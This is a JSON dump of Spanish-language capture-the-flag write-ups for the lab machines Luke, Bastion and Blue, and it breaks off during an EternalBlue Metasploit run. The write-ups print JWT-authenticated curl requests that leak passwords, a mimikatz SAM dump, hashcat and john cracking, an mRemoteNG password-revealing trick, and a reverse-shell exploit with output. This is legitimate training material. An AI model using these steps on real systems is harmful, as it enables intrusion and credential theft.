successful!\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#34;}   CREDENCIALES Utilizamos el token de autenticacion para poder acceder a los usuarios dentro del \u0026ldquo;directorio\u0026rdquo; /users.\n1 2 3  curl -X GET \\  -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; \\  http://10.10.10.137:3000/users   El resultado del request, obtuvimos algunos nombres con su respectivo ID, Nombre y Rol que tiene cada uno de ellos.\n1  [{\u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34;}]   Users:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [ { \u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34; } ]   Visitamos de igual forma la siguiente ruta con el token /users/Admin y obtuvimos la contraseña del usuario admin.\nRequest:\n1  curl -X GET -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; http://10.10.10.137:3000/users/admin/   Respuesta:\n1  {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;}   Utilizamos el mismo request cambiamos /admin/ por la lista de usuarios que encontramos para obtener las contraseñas de los mismos.\nUser-Pass:\n1 2 3 4  {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;rZ86wwLvx7jUxtch\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;bet@tester87\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;5y:!xa=ybfe)/QD\u0026#34;}   PUERTO 80 - AUTH Utilizamos las Credenciales en los distintos paneles que encontramos, en el caso de las credenciales de Derry funcionaron en el panel de /management en el puerto 80 y nos muestra:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  { \u0026#34;users\u0026#34;: { \u0026#34;root\u0026#34;: { \u0026#34;configs\u0026#34;: { \u0026#34;ajenti.plugins.notepad.notepad.Notepad\u0026#34;: \u0026#34;{\\\u0026#34;bookmarks\\\u0026#34;: [], \\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.terminal.main.Terminals\u0026#34;: \u0026#34;{\\\u0026#34;shell\\\u0026#34;: \\\u0026#34;sh -c $SHELL || sh\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.ipmap.ElementsIPMapper\u0026#34;: \u0026#34;{\\\u0026#34;users\\\u0026#34;: {}}\u0026#34;, \u0026#34;ajenti.plugins.munin.client.MuninClient\u0026#34;: \u0026#34;{\\\u0026#34;username\\\u0026#34;: \\\u0026#34;username\\\u0026#34;, \\\u0026#34;prefix\\\u0026#34;: \\\u0026#34;http://localhost:8080/munin\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;123\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.dashboard.dash.Dash\u0026#34;: \u0026#34;{\\\u0026#34;widgets\\\u0026#34;: [{\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.MemoryWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.SwapWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.dashboard.welcome.WelcomeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.uptime.UptimeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.power.power.PowerWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.cpu.CPUWidget\\\u0026#34;}]}\u0026#34;, \u0026#34;ajenti.plugins.elements.shaper.main.Shaper\u0026#34;: \u0026#34;{\\\u0026#34;rules\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.ajenti_org.main.AjentiOrgReporter\u0026#34;: \u0026#34;{\\\u0026#34;key\\\u0026#34;: null}\u0026#34;, \u0026#34;ajenti.plugins.logs.main.Logs\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/var/log\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.mysql.api.MySQLDB\u0026#34;: \u0026#34;{\\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;root\\\u0026#34;, \\\u0026#34;hostname\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.fm.fm.FileManager\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.tasks.manager.TaskManager\u0026#34;: \u0026#34;{\\\u0026#34;task_definitions\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.users.UserManager\u0026#34;: \u0026#34;{\\\u0026#34;sync-provider\\\u0026#34;: \\\u0026#34;\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.usersync.adsync.ActiveDirectorySyncProvider\u0026#34;: \u0026#34;{\\\u0026#34;domain\\\u0026#34;: \\\u0026#34;DOMAIN\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;Administrator\\\u0026#34;, \\\u0026#34;base\\\u0026#34;: \\\u0026#34;cn=Users,dc=DOMAIN\\\u0026#34;, \\\u0026#34;address\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.usermgr.ElementsUserManager\u0026#34;: \u0026#34;{\\\u0026#34;groups\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.elements.projects.main.ElementsProjectManager\u0026#34;: \u0026#34;{\\\u0026#34;projects\\\u0026#34;: \\\u0026#34;KGxwMQou\\\\n\\\u0026#34;}\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;KpMasng6S5EtTy9Z\u0026#34;, \u0026#34;permissions\u0026#34;: [] } }, \u0026#34;language\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;bind\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;port\u0026#34;: 8000 }, \u0026#34;enable_feedback\u0026#34;: true, \u0026#34;ssl\u0026#34;: { \u0026#34;enable\u0026#34;: false, \u0026#34;certificate_path\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;authentication\u0026#34;: true, \u0026#34;installation_id\u0026#34;: 12354 }   1  $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error);   login.php Nos enfocamos en el archivo config.json el cual contiene configuracion del mismo usuario root, contraseña, y algunas otras configuraciones, una de las cuales nos muestra el host y puerto. Las credenciales:\n1 2  user: root password: KpMasng6S5EtTy9Z   AJENTI Utilizamos las credenciales en el puerto 8000 y pudimos logearnos a la plataforma Ajenti.\nSHELL - USER/ROOT Utilizamos la opcion de TERMINAL que nos ofrece Ajenti y obtenemos una shell como usuario root, y las banderas user.txt/root.txt.\nSHELL ","description":"En Luke descubrimos credenciales las cuales permitieron autenticarnos en el puerto 3000 donde obtuvimos nuevas credenciales para el panel administrativo que posteriormente nos dio acceso por Ajenti donde ejecutamos una terminal con acceso privilegiado.","id":133,"section":"posts","tags":["ftp","ajenti","jwt"],"title":"Hack The Box - Luke","uri":"https://sckull.github.io/posts/luke/"},{"content":"  Bastion es una maquina con dificultad facil, tiene un Disco Duro Virtual (VHD) expuesto en recurso de SAMBA, utilizando Windows montamos el disco y obtuvimos los hashes con mimikatz seguidamente con John una contraseña lo que nos dio acceso al servicio SSH. Importando el archivo de configuracion de mRemoteNG nos permitió obtener credenciales y escalar privilegios.\nInformacion de la Maquina    Nombre Bastion      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.134   Maker L4mpje    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.5, 7.8, 5.7, 4.3, 2.2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 9, 4, 6, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos UDP/TCP con masscan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@sckull:~/htb/bastion# masscan -p1-65535,U:1-65535 10.10.10.134 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-07 17:02:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.134 Discovered open port 135/tcp on 10.10.10.134 Discovered open port 5985/tcp on 10.10.10.134 Discovered open port 49664/tcp on 10.10.10.134 Discovered open port 49666/tcp on 10.10.10.134 Discovered open port 445/tcp on 10.10.10.134 Discovered open port 49668/tcp on 10.10.10.134 Discovered open port 139/tcp on 10.10.10.134 Discovered open port 49667/tcp on 10.10.10.134 Discovered open port 47001/tcp on 10.10.10.134 Discovered open port 49670/tcp on 10.10.10.134 Discovered open port 49669/tcp on 10.10.10.134   Escaneo de puertos TCP con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  root@sckull:~/htb/bastion# nmap -p49667,139,49670,445,49669,49668,135,49666,22 -sV -A -O 10.10.10.134 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 18:58 BST Nmap scan report for 10.10.10.134 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microso$t Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-05-07T20:00:16+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-05-07 19:00:12 |_ start_date: 2019-05-07 10:50:40 TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 123.61 ms 10.10.14.1 2 123.96 ms 10.10.10.134 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.98 seconds   SMB Escaneo de sharenames en SMB con smbclient.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/bastion# smbclient -L \\\\10.10.10.134 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPC Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available   SMB - Backups Encontramos una nota (note.txt) en el sharename de Backups, esta nos habla de un backup.\nnote.txt\nTambien encontramos una carpeta de un backup de la maquina en \\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\ dentro encontramos varios archivos xml y archivo vhd.\nSMB - Montar archivo VHD Mount VHD stored\nPara poder ver lo que contiene el archivo backup en SMB montamos el SHARENAME localmente para luego hacer lo mismo con el backup y poder ver los archivos en su interior. Para ello utilizamos una maquina Windows.\nComandos:\n1 2 3 4 5 6 7  net use h: \\\\10.10.10.134\\Backups DISKPART SELECT VDISK FILE=\u0026#34;H:\\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd\u0026#34; ATTACH VDISK ASSIGN LETTER=E exit dir e:   SAM-SYSTEM HASHES Ahora que tenemos acceso al backup de la maquina podemos buscar contraseñas guardadas, existen diferentes lugares y archivos donde podemos encontrar contraseñas almacenadas (Password Stored), en esta maquina las encontramos en C:\\Windows\\System32\\config\\, donde podemos ver dos archivos uno llamado SAM y otro SYSTEM los cuales contienen hashes de autenticacion almacenadas por SAM (Security Account Manager).\nPara obtener los hash podemos utilizar mimikatz y samdump2.\nMIMIKATZ 1  mimikatz - lsadump::sam   SAMDUM2 Utilizamos los hash para ver los permisos del usuario L4mpje en los SHARENAMES.\n1  aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9   Crack HASHES HASHCAT 1  hashcat/hashcat64.bin -m 1000 bastion.txt rockyou.txt -o bastion_pass.txt   JOHN 1  john --format=NT-old --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   Cracked:\n26112010952d963c8dc4217daec986d9:bureaulampje\nUSER - L4mpje Ahora que tenemos la contraseña para el usuario L4ampje podemos logearnos en el servicio ssh.\nObtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION - nRemoteNG Al enumerar los programas nos encontramos con uno no muy comun en maquinas windows mRemoteNG.\nAl investigar un poco sobre este programa y sus vulnerabilidades encontramos que los archivos de configuracion contienen contraseñas encriptadas y las cuales pueden ser facilmente desencriptadas (Stealing Password from mremote). Aparentemente es una vulnerabilidad que no afecta a esta version del programa.\nArchivos de configuracion (c:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG).\nUtilizamos mRemoteNG para ver el fuincionamiento de los archivos de configuracion. Para ello creamos un nuevo archivo de configuracion agregamos las credenciales del usuario L4mpje y utilizamos la opcion de SSH2, como vemos nos pudimos conectar exitosamente mediante ssh con el programa.\nAl guardar el archivo de conexion vemos que es un archivo XML, dicho archivo tiene la misma estructura del archivo de configuracion que tiene la maquina en AppData. Eliminamos la conexion de la lista de conexiones en mRemoteNG e importamos nuevamente el archivo que habiamos guardado (Bastion_file.xml), al cargarse este archivo se cargaron las credenciales y la configuracion de SSH2 anteriormente realizadas.\nEstructura del archivo XML\nAhora que sabemos que podemos importar un archivo de configuracion, vamos a intentar impoartar el archivo de configuracion que esta en la maquina, para ello lo descargamos. Vemos la misma configuracion que tiene nuestro archivo que guardamos anteriormente.\nImportamos el archivo al programa y nos muestra dos conexiones una del usuario Administrador y de L4mpje.\nConexion DC\nConexion L4mpje-PC\nComo podemos ver las direcciones IP a las que estan configuradas esas conexiones son locales vamos a cambiarlas y dirigirlas a la IP de la maquina (10.10.10.134), de la misma forma para el SSH e intentamos conectarnos.\nL4mpje\nAdministrator - Shell Finalmente obtenemos una shell como Administrador y nuestra bandera root.txt.\nAl investigar acerca del crackeo de Contraseñas, encontre un post mRemote Crack Password en el cual muestra que podemos sacar la contraseña de cualquier conexion o configuracion de conexion mediante la creacion de una Herramienta externa con los siguientes datos:\n1 2  File Name : cmd Arguments : /k echo %password%   Para extraer la contraseña seleccionamos la conexion y le damos a ejecutar Herramienta externa \u0026gt; Seleccionamos la que hemos creado.\nAsi es como obtenemos la contraseña de Administrator y L4mpje.\n1 2  Administrator:thXLHM96BeKL0ER2 L4mpje:bureaulampje   ","description":"Bastion es una maquina con dificultad facil, tiene un Disco Duro Virtual (VHD) expuesto en recurso de SAMBA, utilizando Windows montamos el disco y obtuvimos los hashes con mimikatz seguidamente con John una contraseña lo que nos dio acceso al servicio SSH. Importando el archivo de configuracion de mRemoteNG nos permitió obtener credenciales y escalar privilegios.","id":134,"section":"posts","tags":["smbclient","smbmap","vhd","mimikatz","samdump2","nRemoteNG"],"title":"Hack The Box - Bastion","uri":"https://sckull.github.io/posts/bastion/"},{"content":"  Blue es una maquina de TryHackMe, presenta una vulnerabilidad Eternal Blue, utilizamos metasploit para configurar y explotar la vulnerabilidad encontrada y obtener las flags.\nRoom    Titulo Blue      Descripción Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues.   Puntos 630   Dificultad Facil   Maker DarkStar7471     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  root@kali:~/trymehack/blue# masscan -p1-65535,U:1-65535 10.10.24.91 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-04 00:56:01 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.24.91 Discovered open port 49154/tcp on 10.10.24.91 Discovered open port 49152/tcp on 10.10.24.91 Discovered open port 137/udp on 10.10.24.91 Discovered open port 3389/tcp on 10.10.24.91 # Nmap 7.70 scan initiated Tue Sep 3 21:03:21 2019 as: nmap -sC -sV -p1-1000 -o nmap.scan_mil 10.10.24.91 Nmap scan report for 10.10.24.91 Host is up (0.23s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:ae:0a:27:4e:02 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-09-03T20:04:00-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-09-03 21:04:00 |_ start_date: 2019-09-03 20:54:40 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 21:04:06 2019 -- 1 IP address (1 host up) scanned in 45.67 seconds   SMBCLIENT \u0026amp; SMBMAP Escaneo de sharenames.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@kali:~/trymehack/blue# smbclient -L \\\\10.10.24.91 Enter WORKGROUP\\root\u0026#39;s password: Anonymous login successful Sharename Type Comment --------- ---- ------- smb1cli_req_writev_submit: called for dialect[SMB2_10] server[10.10.24.91] Error returning browse list: NT_STATUS_REVISION_MISMATCH Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.24.91 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available root@kali:~/trymehack/blue# smbmap -H 10.10.24.91 [+] Finding open SMB ports.... root@kali:~/trymehack/blue#   NMAP - SMB SCRIPTS Utilizamos los scripts de nmap para verificar si alguno es vulnerable con la maquina, y, encontramos que es vulnerable a ms17-010 o ETERNALBLUE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  root@kali:~/trymehack/blue# nmap --script smb-vuln-* 10.10.24.91 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 21:11 EDT Nmap scan report for 10.10.24.91 Host is up (0.20s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown 49159/tcp open unknown Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds   METASPLOIT - ETERNALBLUE Utilizamos metasploit y el exploit exploit/windows/smb/ms17_010_eternalblue contra la maquina, lo configuramos y corremos el exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  msf5 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.24.91 rhosts =\u0026gt; 10.10.24.91 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [+] 10.10.24.91:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.24.91:445 - Connecting to target for exploitation. [+] 10.10.24.91:445 - Connection established for exploitation. [+] 10.10.24.91:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.24.91:445 - CORE raw buffer dump (42 bytes) [*] 10.10.24.91:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.24.91:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.24.91:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.24.91:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.24.91:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.24.91:445 - Sending all but last fragment 